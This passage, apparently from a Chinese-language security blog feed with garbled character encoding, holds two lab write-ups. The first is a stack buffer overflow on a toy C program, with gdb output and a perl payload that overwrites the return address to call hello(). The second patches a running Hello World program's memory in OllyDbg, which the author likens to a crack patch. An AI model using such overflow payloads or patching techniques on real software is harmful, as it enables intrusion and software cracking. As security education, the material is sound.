0xf7fb8000 0xffffcfd8 0x080484a9(gdb) å¯ä»¥çœ‹åˆ°å¯„å­˜å™¨ä¸­æœ‰4ä¸ª41ï¼Œå› ä¸ºAçš„ASCIIç å¯¹åº”çš„å°±æ˜¯41ï¼Œæˆ‘ä»¬ä¼ å…¥4ä¸ªAå°±ä¼šæœ‰4ä¸ª41ã€‚ åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥14ä¸ªAé‡æ–°è¿è¡Œï¼Œç„¶åŽå†æ¬¡åˆ°è¾¾13è¡Œæ–­ç‚¹ä½ç½®ï¼ŒæŸ¥çœ‹å¯„å­˜å™¨å†…å®¹ä¸ºäº†æ–¹ä¾¿æ“ä½œï¼Œè¿™é‡Œä½¿ç”¨perlè¯­è¨€è¾“å‡ºæ•°æ®é…åˆè¿è¡Œ123456789101112131415(gdb) r `perl -e 'print "A"x14'`The program being debugged has been started already.Start it from the beginning? (y or n) yStarting program: /home/lanshiqin/æ¡Œé¢/main `perl -e 'print "A"x14'`Breakpoint 2, main (argc=2, argv=0xffffd084) at main.c:2020 fun(str);(gdb) nBreakpoint 1, fun (str=0xffffd27f 'A' &lt;repeats 14 times&gt;) at main.c:1313 printf("%s\n", buf);(gdb) x/8x $esp0xffffcf90: 0xffffffff 0x4141002f 0x41414141 0x414141410xffffcfa0: 0x41414141 0xf7fb8000 0xffffcfd8 0x080484a9(gdb) å¯ä»¥çœ‹åˆ°å¯„å­˜å™¨ä¸­å·²ç»æœ‰14ä¸ªAçš„ASCIIç å€¼41äº†ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥çœ‹åˆ°callæŒ‡ä»¤ä¸‹é¢çš„æŒ‡ä»¤åœ°å€0x080484a9ä¹Ÿåœ¨å¯„å­˜å™¨ä¸­äº†,æˆ‘ä»¬è¦åšçš„å°±æ˜¯è¦†ç›–è¿™ä¸ªåœ°å€ï¼Œåªè¦å°†è¿™ä¸ªåœ°å€ä¿®æ”¹ä¸ºhelloå‡½æ•°æ‰€åœ¨çš„åœ°å€ï¼Œé‚£ä¹ˆç¨‹åºå°±ä¼š æ‰§è¡Œhelloå‡½æ•°ã€‚é€šè¿‡è§‚å¯Ÿå‘çŽ°ï¼Œè¦ç”¨Aè¦†ç›–æ»¡åº•ä¸‹çš„å¯„å­˜å™¨æ•°æ®ï¼Œè¿˜éœ€è¦12ä¸ªAï¼Œä¹Ÿå°±æ˜¯æ€»å…±éœ€è¦26ä¸ªAæ‰èƒ½å…¨éƒ¨è¦†ç›–ã€‚åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥26ä¸ªAé‡æ–°è¿è¡Œï¼Œç„¶åŽå†æ¬¡åˆ°è¾¾13è¡Œæ–­ç‚¹ä½ç½®ï¼ŒæŸ¥çœ‹å¯„å­˜å™¨å†…å®¹ã€‚123456789101112131415(gdb) r `perl -e 'print "A"x26'`The program being debugged has been started already.Start it from the beginning? (y or n) yStarting program: /home/lanshiqin/æ¡Œé¢/main `perl -e 'print "A"x26'`Breakpoint 2, main (argc=2, argv=0xffffd074) at main.c:2020 fun(str);(gdb) nBreakpoint 1, fun (str=0xffffd200 "\027") at main.c:1313 printf("%s\n", buf);(gdb) x/8x $esp0xffffcf80: 0xffffffff 0x4141002f 0x41414141 0x414141410xffffcf90: 0x41414141 0x41414141 0x41414141 0x41414141(gdb) å¯ä»¥çœ‹åˆ°26ä¸ªAå·²ç»æŠŠæœ€åŽçš„æ•°æ®å…¨éƒ¨è¦†ç›–äº†ï¼Œæˆ‘ä»¬è¦åšçš„æ˜¯è®©ç¨‹åºæ‰§è¡Œåˆ°helloå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦22ä¸ªAå¹¶ä¸”åŠ ä¸Šhelloå‡½æ•°çš„é¦–åœ°å€ã€‚é€šè¿‡è°ƒè¯•å¯çŸ¥helloå‡½æ•°çš„é¦–åœ°å€æ˜¯0x0804843b,æˆ‘ä»¬ä½¿ç”¨perlå¯¹åœ°å€è¿›è¡Œæ ¼å¼åŒ–è¾“å‡ºï¼Œéœ€è¦å°†è¿™ä¸ª16è¿›åˆ¶åœ°å€ç”±åŽå‘å‰æ¯ä¸¤ä½è¿›è¡Œä¸€ä¸ª\xæ‹¼æŽ¥ï¼Œå¾—åˆ°çš„å†…å®¹æ˜¯ \x3b\x84\x04\x08ã€‚ åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥22ä¸ªAåŠ ä¸Šhelloå‡½æ•°åœ°å€é‡æ–°è¿è¡Œ,ä¸€è·¯è¾“å…¥nå•æ­¥è¿è¡Œã€‚12345678910111213141516171819202122232425(gdb) r `perl -e 'print "A"x22;print "\x3b\x84\x04\x08"'`The program being debugged has been started already.Start it from the beginning? (y or n) yStarting program: /home/lanshiqin/æ¡Œé¢/main `perl -e 'print "A"x22;print "\x3b\x84\x04\x08"'`Breakpoint 2, main (argc=2, argv=0xffffd074) at main.c:2020 fun(str);(gdb) nBreakpoint 1, fun (str=0xffffd200 "\027") at main.c:1313 printf("%s\n", buf);(gdb) nAAAAAAAAAAAAAAAAAAAAAA;ï¿½14 return 0;(gdb) n15 &#125;(gdb) nhello () at main.c:55 &#123;(gdb) n6 printf("hello\n");(gdb) nhello7 &#125;(gdb) n å¯ä»¥çœ‹åˆ°ä¸Šé¢çš„ç¨‹åºå·²ç»æ‰§è¡Œåˆ°helloå‡½æ•°äº†ï¼Œæˆ‘ä»¬å¯ä»¥è¾“å…¥qå‘½ä»¤é€€å‡ºè°ƒè¯•ã€‚ ä¸ºäº†éªŒè¯ç¼“å†²åŒºæº¢å‡ºæ¼æ´žï¼Œæˆ‘ä»¬çŽ°åœ¨ç›´æŽ¥è¿è¡Œç¨‹åºï¼ŒåŽé¢è·Ÿä¸Šæˆ‘ä»¬ä¹‹å‰è°ƒè¯•åˆ†æžæ—¶å¾—åˆ°çš„ç»“è®ºæ•°æ®è¿›è¡Œè¿è¡Œã€‚1234lanshiqin@lanshiqin-Parallels-Virtual-Platform:~/æ¡Œé¢$ ./main `perl -e 'print "A"x22;print "\x3b\x84\x04\x08"'`AAAAAAAAAAAAAAAAAAAAAA;ï¿½helloæ®µé”™è¯¯ (æ ¸å¿ƒå·²è½¬å‚¨) å¯ä»¥çœ‹åˆ°ç¨‹åºè°ƒç”¨äº†helloå‡½æ•°ï¼Œå¹¶ä¸”æˆåŠŸè¾“å‡ºäº†helloã€‚è™½ç„¶æœ€åŽæç¤ºç¨‹åºæ®µé”™è¯¯ï¼Œä½†æ˜¯æˆ‘ä»¬å·²ç»æˆåŠŸçš„é€šè¿‡è®©ç¨‹åºæŽ¥æ”¶æ•°æ®çš„ç¼“å†²åŒºæº¢å‡ºï¼Œæ”¹å˜äº†ç¨‹åºçš„æ‰§è¡Œé€»è¾‘ï¼Œæ‰§è¡Œäº†å…¶ä»–å‡½æ•°ã€‚ å¦‚æžœè¿™æ˜¯ä¸ªå…·æœ‰ç½‘ç»œé€šä¿¡åŠŸèƒ½çš„ç¨‹åºï¼Œé€šè¿‡ç¼“å†²åŒºæ¼æ´žå¯ä»¥ä½¿æ”»å‡»è€…è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç ï¼Œå¾—åˆ°ç›®æ ‡ç³»ç»Ÿçš„æŽ§åˆ¶æƒã€‚ç¼“å†²åŒºæº¢å‡ºæ”»å‡»æˆä¸ºè¿œç¨‹æ”»å‡»çš„ä¸»è¦æ‰‹æ®µï¼Œæ”»å‡»è€…é€šè¿‡ç›®æ ‡ipåœ°å€æ‰«æè®¡ç®—æœºçš„å¼€æ”¾çš„ç«¯å£ï¼Œå¹¶å¯¹ç«¯å£ç¨‹åºè¿›è¡Œç¼“å†²åŒºæº¢å‡ºæ”»å‡»ï¼Œå¦‚æžœè¿™ä¸ªç«¯å£çš„ç¨‹åºå­˜åœ¨ç¼“å†²åŒºæ¼æ´žï¼Œé‚£ä¹ˆè¿™å°è®¡ç®—æœºå°†ä¼šè¢«æ”»é™·ã€‚ é˜²èŒƒéƒ¨åˆ†ï¼šçŽ°ä»£æ“ä½œç³»ç»Ÿå¯¹ç¼“å†²åŒºæº¢å‡ºæ”»å‡»åšäº†é˜²èŒƒï¼Œæ¯”å¦‚ASLR(åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–),æ˜¯å‚ä¸Žä¿æŠ¤ç¼“å†²åŒºæº¢å‡ºé—®é¢˜çš„ä¸€ä¸ªè®¡ç®—æœºå®‰å…¨æŠ€æœ¯ã€‚æ˜¯ä¸ºäº†é˜²æ­¢æ”»å‡»è€…åœ¨å†…å­˜ä¸­èƒ½å¤Ÿå¯é åœ°å¯¹è·³è½¬åˆ°ç‰¹å®šåˆ©ç”¨å‡½æ•°ã€‚ASLRåŒ…æ‹¬éšæœºæŽ’åˆ—ç¨‹åºçš„å…³é”®æ•°æ®åŒºåŸŸçš„ä½ç½®ï¼ŒåŒ…æ‹¬å¯æ‰§è¡Œçš„éƒ¨åˆ†ã€å †ã€æ ˆåŠå…±äº«åº“çš„ä½ç½®ã€‚ ç¼“å†²åŒºæº¢å‡ºæ™®éå­˜åœ¨äºŽæ—§ç‰ˆç³»ç»Ÿç­‰ç¨‹åºä¸Šï¼Œæ¯”å¦‚Windows xpçš„pop3æœåŠ¡å°±å­˜åœ¨ç¼“å­˜åŒºæº¢å‡ºæ¼æ´žï¼Œé€šè¿‡è¯¥æ¼æ´žå¯ä»¥æ³¨å…¥shellocode,æ‹¿åˆ°æŽ§åˆ¶æƒè¿›è¡Œä»»æ„æ“ä½œï¼Œæ¯”å¦‚å¼€å¯3389ç«¯å£æ·»åŠ ç”¨æˆ·ç­‰æ“ä½œï¼ŒéšåŽå°±å¯ä»¥é€šè¿‡æ·»åŠ çš„ç”¨æˆ·è¿›è¡Œè¿œç¨‹ç™»å½•ï¼ŒWindows XP ç³»ç»Ÿç›®å‰åœ¨å›½å†…çš„å­¦æ ¡å’Œä¸€äº›æ”¿åºœæœºæž„ä¾ç„¶åœ¨ä½¿ç”¨ï¼Œä¸‹ä¸€ä¸ªå®žéªŒå†…å®¹æˆ‘å°†ä¼šè®°å½•å¦‚ä½•é€šè¿‡ç¼“å†²åŒºæº¢å‡ºæ¼æ´ž è¿œç¨‹å…¥ä¾µæ“ä½œç³»ç»Ÿã€‚]]></content>
      <categories>
        <category>å®žéªŒ</category>
      </categories>
      <tags>
        <tag>å®žéªŒ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World çš„æ¼æ´ž]]></title>
    <url>%2Fd7e81382%2F</url>
    <content type="text"><![CDATA[ä»»ä½•ç¨‹åºéƒ½æœ‰æ¼æ´žï¼ŒåŒ…æ‹¬ç®€å•çš„ Hello Worldç¨‹åºï¼Œè¿™æ˜¯ä¸€ä¸ªå®¢è§‚å­˜åœ¨çš„äº‹å®žã€‚ä¹Ÿè®¸ä½ ä¼šè´¨ç–‘ï¼Œä¸€ä¸ªç”¨C/C++è¯­è¨€ç¼–å†™çš„è¾“å‡ºä¸€å¥ Hello World çš„ç¨‹åºæ¼æ´žåœ¨å“ªé‡Œï¼Ÿå®žé™…ä¸Šï¼Œç¨‹åºæ¼æ´žä¸ä¸€å®šå…¨éƒ¨éƒ½æ¥è‡ªä»£ç é€»è¾‘ï¼Œæ¼æ´žè¿˜å‘ç”Ÿåœ¨ç¨‹åºè¿è¡Œæ—¶æœŸã€‚é€šè¿‡æŠ€æœ¯æ‰‹æ®µå¹²æ‰°ç¨‹åºæ‰§è¡Œï¼Œä½¿ç¨‹åºä¸èƒ½å¾—åˆ°é¢„æœŸçš„æ‰§è¡Œç»“æžœï¼Œé‚£ä¹ˆè¿™ä¸ªç¨‹åºå°±å‡ºçŽ°äº†æ¼æ´žã€‚ åˆ†æžè€…åœ¨æ²¡æœ‰ç¨‹åºæºä»£ç çš„æƒ…å†µä¸‹ï¼Œåªèƒ½é€šè¿‡é€†åˆ†æžç¨‹åºçš„æ¼æ´žï¼Œå¸¸è§„æ“ä½œé€šå¸¸æ˜¯æ‰¾åˆ°ç¨‹åºçš„å…¥å£ç‚¹ï¼Œè¿›ä¸€æ­¥è·Ÿè¸ªç¨‹åºçš„è°ƒç”¨é€»è¾‘å’Œæ•°æ®ï¼Œé€šè¿‡ä¿®æ”¹å…¶ä¸­çš„è°ƒç”¨æˆ–è€…æ•°æ®ï¼Œä½¿ç¨‹åºå‡ºçŽ°æ¼æ´žã€‚ è¦åšçš„äº‹ï¼š ç”¨C/C++ç¼–å†™ä¸€ä¸ªè¾“å‡ºâ€Hello,World!â€çš„å¯æ‰§è¡Œçš„exeç¨‹åºã€‚ åœ¨ç¨‹åºè¿è¡ŒæœŸé—´ä¿®æ”¹å†…å­˜ä¸­çš„æ•°æ®ï¼Œä½¿ç¨‹åºè¾“å‡º â€œHi,lanshiqinâ€ ä½¿ç”¨çš„å·¥å…·ï¼š VisualStudio Ollydbg ä¸ºäº†å‡å°ç¯‡å¹…ï¼Œä¸å†å•°å—¦æ€Žä¹ˆåˆ›å»ºé¡¹ç›®ï¼Œç›´æŽ¥ä¸Šä»£ç ç»å…¸çš„ Helloï¼ŒWorldï¼æºä»£ç å¦‚ä¸‹ï¼š123456789#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main(int argc, char* argv)&#123; printf("Hello,World!\n"); system("pause"); return 0;&#125; å°†ç¨‹åºç¼–è¯‘æˆå¯æ‰§è¡Œç¨‹åº HelloWorld.exe å¹¶è¿è¡Œå¯ä»¥çœ‹åˆ°ç¨‹åºæŒ‰æºä»£ç æ‰€ç¼–å†™çš„è¯­å¥æ‰§è¡Œï¼Œå¾—åˆ°äº†é¢„æœŸçš„è¾“å‡ºç»“æžœã€‚ ä¹Ÿè®¸æœ‰äººä¼šé—®ï¼Œæˆ‘ç›´æŽ¥ä¿®æ”¹ç¨‹åºçš„æºä»£ç ï¼Œç„¶åŽå†ç¼–è¯‘æˆå¯æ‰§è¡Œç¨‹åºè¿è¡Œï¼Œå°±å¯ä»¥å¾—åˆ°æƒ³è¦çš„è¾“å‡ºç»“æžœäº†ï¼Œä¸ºä»€ä¹ˆè¦ç”¨åæ±‡ç¼–å·¥å…·è°ƒè¯•è¿™ä¹ˆéº»çƒ¦ï¼Ÿ å› ä¸ºæˆ‘ä»¬æ—¥å¸¸ä½¿ç”¨çš„ç»å¤§å¤šæ•°è½¯ä»¶éƒ½æ˜¯è½¯ä»¶å…¬å¸æˆ–è€…å…¶ä»–ä¸ªäººå¼€å‘è€…çš„äº§å“ï¼Œæˆ‘ä»¬ä¸æ˜¯è¿™äº›è½¯ä»¶çš„å¼€å‘è€…ï¼Œæ‰€ä»¥æˆ‘ä»¬æ²¡æœ‰è¿™äº›è½¯ä»¶çš„æºä»£ç ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡é€†å‘æ¥å¯¹ç¨‹åºè¿›è¡Œåˆ†æžã€‚åœ¨äº’è”ç½‘ä¸Šæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šæ­£ç‰ˆçš„æ”¶è´¹è½¯ä»¶æœ‰å¯¹åº”çš„ç ´è§£ç‰ˆï¼Œè¿™äº›ç ´è§£ç‰ˆè½¯ä»¶å°±æ˜¯æœ‰äººé€šè¿‡é€†å‘æ‰¾åˆ°ç¨‹åºå…¥å£å¹¶ä¿®æ”¹å…¶ä¸­çš„æ•°æ®ï¼Œé€šè¿‡ç¨‹åºé€»è¾‘æ¼æ´žæˆ–è€…è¿è¡Œæ—¶æœŸçš„æ¼æ´žå¯¹è½¯ä»¶è¿›è¡Œç ´è§£ã€‚ ä¸€ä¸ªç¨‹åºè¦è¢«CPUæ‰§è¡Œï¼Œé¦–å…ˆéœ€è¦å…ˆè¢«è½½å…¥å†…å­˜ä¸­ï¼Œæˆ‘ä»¬æƒ³è¦è¾¾åˆ°ä¿®æ”¹ç¨‹åºçš„é¢„æœŸè¾“å‡ºç»“æžœï¼Œå°±éœ€è¦æ‰¾åˆ°è¿™å—å†…å­˜å¹¶ä¿®æ”¹å…¶ä¸­çš„æ•°æ®ï¼Œä»¥è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„ã€‚ é€†å‘å·¥å…·åœ¨Windowså¹³å°çš„é€†å‘é¢†åŸŸä¸­ï¼Œæœ‰ä¸¤ä¸ªå¾ˆå¥½ç”¨çš„å·¥å…·ï¼Œä¸€ä¸ªæ˜¯Ollydbg(ç®€ç§°OD),ç»å¸¸ç”¨æ¥åšåŠ¨æ€è°ƒè¯•ï¼Œå¦ä¸€ä¸ªæ˜¯IDA ç»å¸¸è¢«ç”¨æ¥é™æ€åˆ†æžã€‚ODç”¨æ¥è°ƒè¯•è¿è¡Œæ—¶æœŸçš„ç¨‹åºï¼Œå¯ä»¥å°†CPUæ‰§è¡Œçš„æœºå™¨æŒ‡ä»¤åæˆæ±‡ç¼–æŒ‡ä»¤ï¼Œå¯ä»¥å®žæ—¶æ–­ç‚¹æŸ¥çœ‹å½“å‰æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œè¿™å¯¹åˆ†æžä¸€äº›ç—…æ¯’çš„è¡Œä¸ºå¾ˆæœ‰ç”¨ï¼Œå¯ä»¥ç»†å¾®åˆ°æ¯ä¸€æ¡æŒ‡ä»¤çš„è°ƒç”¨ï¼Œåˆ†æžå‡ºç¨‹åºå…·ä½“åšäº†ä»€ä¹ˆã€‚IDA ä¸»è¦ç”¨æ¥åˆ†æžå¤æ‚çš„ä»£ç ï¼Œé€šè¿‡å¯æ‰§è¡Œç¨‹åºå¯ä»¥å¾—åˆ°ä¼ªä»£ç ï¼Œå¯¹äºŽä¸€äº›é«˜çº§è¯­è¨€ç¼–å†™çš„ç¨‹åºç”šè‡³å¯ä»¥å¾—åˆ°è¿‘ä¼¼äºŽç¨‹åºçš„æºä»£ç ï¼Œè¿™æ ·å°±å¾ˆæ–¹ä¾¿åŽ»æŸ¥æ‰¾ç¨‹åºé‡Œçš„é€»è¾‘æ¼æ´žã€‚ODå’ŒIDAè¿™ä¸¤ä¸ªå·¥å…·æ˜¯é€†å‘é¢†åŸŸçš„å€šå¤©å‰‘å’Œå± é¾™åˆ€ï¼Œå…·ä½“ä»‹ç»å’ŒåŠŸèƒ½ä½¿ç”¨å¯ä»¥æŸ¥é˜…ç›¸å…³æ–‡æ¡£ã€‚ æ“ä½œæ­¥éª¤1.ä½¿ç”¨ODæ¥æ‰“å¼€HelloWorld.exeæ­¤æ—¶ç¨‹åºè¿˜æ²¡æ‰§è¡Œåˆ°è¾“å‡ºâ€œHelloï¼ŒWorldï¼â€çš„è¯­å¥ï¼Œæ­¤æ—¶æ˜¯ç¨‹åºåˆšåˆšè¢«è½½å…¥å†…å­˜ï¼ŒODç•Œé¢ä¸Šå¯ä»¥çœ‹åˆ°ç¨‹åºå½“å‰æ‰§è¡Œçš„æŒ‡ä»¤ 2.ç»„åˆé”® Alt+Mï¼Œæ‰“å¼€ Memory map çª—å£ï¼Œè¿™æ˜¯ç¨‹åºè¿è¡Œæ—¶çš„å†…å­˜æ•°æ® 3.ç»„åˆé”® Ctrl+B, æœç´¢å†…å­˜ä¸­çš„æ•°æ®ASCIIç è¿™é‡Œè¾“å…¥è¦éœ€è¦æ›¿æ¢çš„â€œHello,World!â€,åº•ä¸‹HEX+00è¿™é‡Œæ˜¯å¯¹åº”ASCIIç å­—ç¬¦çš„åå…­è¿›åˆ¶æ•°æ®ã€‚ 4.ç‚¹å‡»æœç´¢ï¼Œå¯ä»¥çœ‹åˆ°å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå·²ç»æœç´¢åˆ°äº†æ•°æ®ã€‚å¯ä»¥çœ‹åˆ°å¯¹åº”çš„å†…å­˜åœ°å€ï¼ŒHEX dump å’ŒASCII 5.ç»„åˆé”®Ctrl+E, æˆ–è€…ç‚¹å‡»Edit-&gt;Binary edit å¯¹å†…å­˜æ•°æ®è¿›è¡Œç¼–è¾‘å°†ASCIIç çš„â€œHello,World!â€ä¿®æ”¹æˆâ€œHi,lanshiqinâ€ï¼Œç‚¹å‡»OK 6.ç»§ç»­è¿è¡Œç¨‹åºï¼Œå¯ä»¥çœ‹åˆ°æŽ§åˆ¶å°è¾“å‡ºäº† â€œHi,lanshiqinâ€ã€‚é€šè¿‡ä¿®æ”¹ç¨‹åºè¿è¡Œæ—¶çš„å†…å­˜æ•°æ®ï¼Œæˆ‘ä»¬å·²ç»æˆåŠŸçš„æ”¹å˜äº†ç¨‹åºçš„é¢„æœŸç»“æžœã€‚ é€šè¿‡è¿è¡Œæ—¶è°ƒè¯•åªèƒ½å½±å“ç¨‹åºå½“å‰è¿è¡Œçš„ç»“æžœï¼Œå¦‚æžœè¦å½±å“æ¯æ¬¡è¿è¡Œçš„ç»“æžœï¼Œæˆ‘ä»¬å¯ä»¥å°†æ­¤æ¬¡ä¿®æ”¹çš„æŒ‡ä»¤å’Œæ•°æ®ä¿å­˜æˆæ–°çš„å¯æ‰§è¡Œç¨‹åºï¼Œä»¥è¡¥ä¸åŒ…çš„å½¢å¼é™„åŠ æˆä¸€ä¸ªç›®æ ‡ç¨‹åºã€‚ï¼ˆåœ¨æ²¡æœ‰ç¨‹åºæºä»£ç çš„æƒ…å†µä¸‹ï¼Œè¿™ç§åšæ³•ç›¸å½“äºŽè¾¾åˆ°è½¯ä»¶ç ´è§£çš„ç›®çš„ï¼Œè¿™ä¸ªè¡¥ä¸ç›¸å½“äºŽç ´è§£è¡¥ä¸ï¼ŒåŠŸèƒ½æ˜¯ä½¿ç¨‹åºè¾“å‡ºHi,lanshiqinï¼‰ çŽ°åœ¨å·²ç»è¯å®žäº†ï¼Œæ‰€æœ‰ç¨‹åºéƒ½æœ‰æ¼æ´žï¼ŒåŒ…æ‹¬ä»…ä»…æ˜¯è¾“å‡ºä¸€å¥ â€œHello,World!â€çš„ç¨‹åºã€‚ æ‰€ä»¥ï¼Œå¾ˆå¤šç¨‹åºä¸ºäº†é˜²æ­¢è¢«ç ´è§£ï¼Œé€šå¸¸éƒ½ä½¿ç”¨äº†ä»£ç æ··æ·†ï¼Œç¨‹åºåŠ å£³ç­‰ä¿æŠ¤æŽªæ–½ã€‚è¿™äº›æŽªæ–½å¯ä»¥åŠ å¤§ç¨‹åºè¢«ç ´è§£çš„éš¾åº¦ï¼Œä½†æ˜¯ä»ç„¶å­˜åœ¨æ¼æ´žã€‚ä»£ç æ··æ·†åŽç¼–è¯‘ä½¿åˆ†æžè€…å¾ˆéš¾è¯»æ‡‚ä»£ç ï¼Œç¨‹åºåŠ å£³ä¸»è¦æ˜¯ä¸ºäº†ç¨‹åºçš„ä¿æŠ¤ï¼Œé˜²æ­¢åˆ†æžè€…æ‰¾åˆ°ç¨‹åºçš„å…¥å£ç‚¹ã€‚ å¯¹äºŽä»£ç æ··æ·†ï¼Œå¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šé˜²æ­¢è‡ªå·±çš„ç¨‹åºè¢«äººè¿˜åŽŸå‡ºæºä»£ç ï¼Œç›®å‰çš„APPåº”ç”¨ç¨‹åºï¼Œé€šå¸¸æ˜¯ä¸ºäº†é˜²æ­¢åº”ç”¨è¢«æŠ„è¢­ï¼Œè¿™ç‚¹æ··æ·†å°±å¾ˆæœ‰ç”¨ï¼Œå› ä¸ºåˆ†æžè€…èŠ±è´¹å¤§é‡ç²¾åŠ›æ¥åˆ†æžè¿˜åŽŸå‡ºä¸€ä¸ªç¨‹åºçš„å·¥ä½œé‡ï¼Œéƒ½å¯ä»¥å¤Ÿä»–é‡æ–°å†™å‡ºå¥½å‡ ä¸ªæ–°çš„ç¨‹åºäº†ã€‚ä½†æ˜¯æ··æ·†åŽç¨‹åºè¡Œä¸ºä¾ç„¶å¯ä»¥è¢«è½»æ˜“çš„åˆ†æžï¼Œæ‰€æœ‰çš„ç¨‹åºè¿è¡Œæ—¶éƒ½éœ€è¦å…ˆè¢«è½½å…¥å†…å­˜ï¼Œç„¶åŽè¢«CPUæ‰§è¡Œï¼Œåˆ†æžè€…å¯ä»¥é€šè¿‡CPUçš„æ‰§è¡ŒæŒ‡ä»¤è¿›è¡Œè°ƒè¯•åˆ†æžï¼Œå¯ä»¥å¯¹è¿è¡Œæ—¶çš„å†…å­˜è¿›è¡Œåˆ†æžï¼Œè¿›ä¸€æ­¥ä¿®æ”¹å†…å­˜æ•°æ®ï¼Œè¾¾åˆ°ç ´è§£ç›®çš„ï¼Œæ¯”å¦‚è¿™æ˜¯ä¸ªæœ¨é©¬APP,å®‰å…¨äººå‘˜å¯ä»¥è·Ÿè¸ªè¿™ä¸ªç¨‹åºï¼Œåˆ†æžå‡ºè¿™ä¸ªç¨‹åºç©¶ç«Ÿåšäº†ä»€ä¹ˆã€‚ å¯¹äºŽç¨‹åºåŠ å£³ï¼Œé€šå¸¸å¯ä»¥åŽ»å£³ï¼Œç„¶åŽå†æ‰¾ç¨‹åºçš„å…¥å£ç‚¹ã€‚ç¨‹åºçš„å¯åŠ¨è¿‡ç¨‹å’Œå…¥å£ç‚¹æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¤§çš„è¯é¢˜ï¼Œé€šè¿‡C/C++ç¼–å†™çš„ Hello World ç¨‹åºé€†å‘åˆ†æžå‘çŽ°ï¼Œ ç¨‹åºçš„å…¥å£ç‚¹å¹¶ä¸æ˜¯main()å‡½æ•°ã€‚æ•™ç§‘ä¹¦ä¸ºäº†æ˜“äºŽç†è§£ï¼Œé€šå¸¸éƒ½å‘Šè¯‰æˆ‘ä»¬ç¨‹åºçš„å…¥å£ç‚¹æ˜¯main()å‡½æ•°ï¼Œè¿™æ˜¯åœ¨ä»£ç é€»è¾‘çš„è§’åº¦çœ‹ã€‚å¦‚æžœä»Žç¨‹åºæ‰§è¡Œçš„è§’åº¦æ¥çœ‹ï¼Œç¨‹åºçš„å…¥å£ç‚¹å¹¶ä¸æ˜¯main()å‡½æ•°ã€‚å…¥å£ç‚¹å…¶å®žæ˜¯ä¸€ä¸ªåœ°å€ã€‚å…¥å£ç‚¹åœ°å€ä¸æ˜¯main()å‡½æ•°çš„å¼€ç«¯ï¼Œè€Œæ˜¯å¦ä¸€æ®µæ¥è‡ªè¿è¡Œæ—¶çš„ä»£ç ã€‚é€šè¿‡å‰é¢çš„ODåˆ†æžHelloWorld.exeå¯æ‰§è¡Œç¨‹åºï¼Œæˆ‘ä»¬å‘çŽ°ç¨‹åºå¹¶ä¸æ˜¯ä»ŽMainå‡½æ•°å¼€å§‹æ‰§è¡Œçš„ï¼Œæ•™ç§‘ä¹¦ä¸Šæ‰€è°“çš„â€œå…¥å£åœ°å€Mainå‡½æ•°â€œå…¶å®žä¹Ÿæ˜¯ä¸€ä¸ªå‚æ•°ï¼Œéœ€è¦è¢«åˆ«äººè°ƒç”¨ã€‚å¯¹äºŽé€†å‘å¯»æ‰¾ç¨‹åºå…¥å£ç‚¹ ä¸å†è®°å½•ç¬”è®°ï¼Œå› ä¸ºå·²ç»æœ‰äººå†™äº†å¾ˆå¥½çš„æ–‡ç« ï¼šhttps://bbs.pediy.com/thread-216976.htmä½¿ç”¨VisualStudioæ–­ç‚¹è°ƒè¯•HelloWorldçš„æºä»£ç åœ¨è°ƒç”¨å †æ ˆçª—å£å¯ä»¥çœ‹åˆ°å‡½æ•°è°ƒç”¨å…³ç³»ï¼Œæ‰“å¼€mainCRTStartupï¼Œå¯ä»¥çœ‹åˆ°å¦‚ä¸‹å›¾æ‰€ç¤ºï¼šå¯ä»¥å‘çŽ°æœ‰è¿™ä¹ˆä¸€å¥èµ‹å€¼è¯­å¥ï¼Œmainret = main(argc, argv, envp);mainå‡½æ•°ä½œä¸ºå‚æ•°èµ‹å€¼ç»™äº†mainretå˜é‡ã€‚åœ¨å¾®è½¯çš„Windowsæ“ä½œç³»ç»Ÿä¸Šï¼Œå¯æ‰§è¡Œç¨‹åºcä¸­æä¾›äº†mainCRTStartup(ï¼‰è¿è¡Œé…ç½®å‡½æ•°ï¼Œé‡Œé¢åŒ…å«äº†ç¨‹åºè¿è¡Œéœ€è¦çš„åº“ä»¥åŠç›¸å…³çš„å­˜å‚¨èµ„æºï¼Œåœ¨é…ç½®å®ŒæˆåŽï¼Œè°ƒç”¨ mainret = main(argc, argv, envp); è¿™æ¡è¯­å¥æ‰€ä»¥mainå¹¶ä¸æ˜¯ç¨‹åºçš„å…¥å£ï¼Œmainåªæ˜¯ä½œä¸ºæ™®é€šçš„å‡½æ•°ã€‚ è®¡ç®—æœºç¨‹åºæœ€ç»ˆéƒ½éœ€è¦åœ¨è®¡ç®—æœºä¸Šè¿è¡Œï¼Œç¨‹åºæœ¬èº«å¯èƒ½å­˜åœ¨é€»è¾‘æ¼æ´žï¼Œæ‰§è¡Œç¨‹åºçš„è®¡ç®—æœºç¡¬ä»¶ä¹Ÿå­˜åœ¨è¢«å¹²æ‰°çš„å¯èƒ½ã€‚æˆ‘ä»¬å¯¹ç¨‹åºçš„å®šä¹‰æ˜¯ï¼šç¨‹åºæ˜¯å¯ä»¥è¢«è®¡ç®—æœºæ‰§è¡Œçš„æŒ‡ä»¤é›†åˆã€‚ä»Žè™šæ‹Ÿçš„æ•°å­¦é€»è¾‘åˆ°çŽ°å®žçš„ç‰©ç†åŒ–å­¦ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€åˆ‡å·²çŸ¥çš„å·¥å…·å’ŒæœªçŸ¥çš„æŠ€æœ¯æ‰‹æ®µåŽ»å¯»æ‰¾ç¨‹åºçš„æ¼æ´žï¼Œæ‰€ä»¥å—å¤–ç•Œæ¡ä»¶çš„å½±å“ï¼Œä»»ä½•ç¨‹åºéƒ½æœ‰æ¼æ´žï¼Œç¨‹åºæ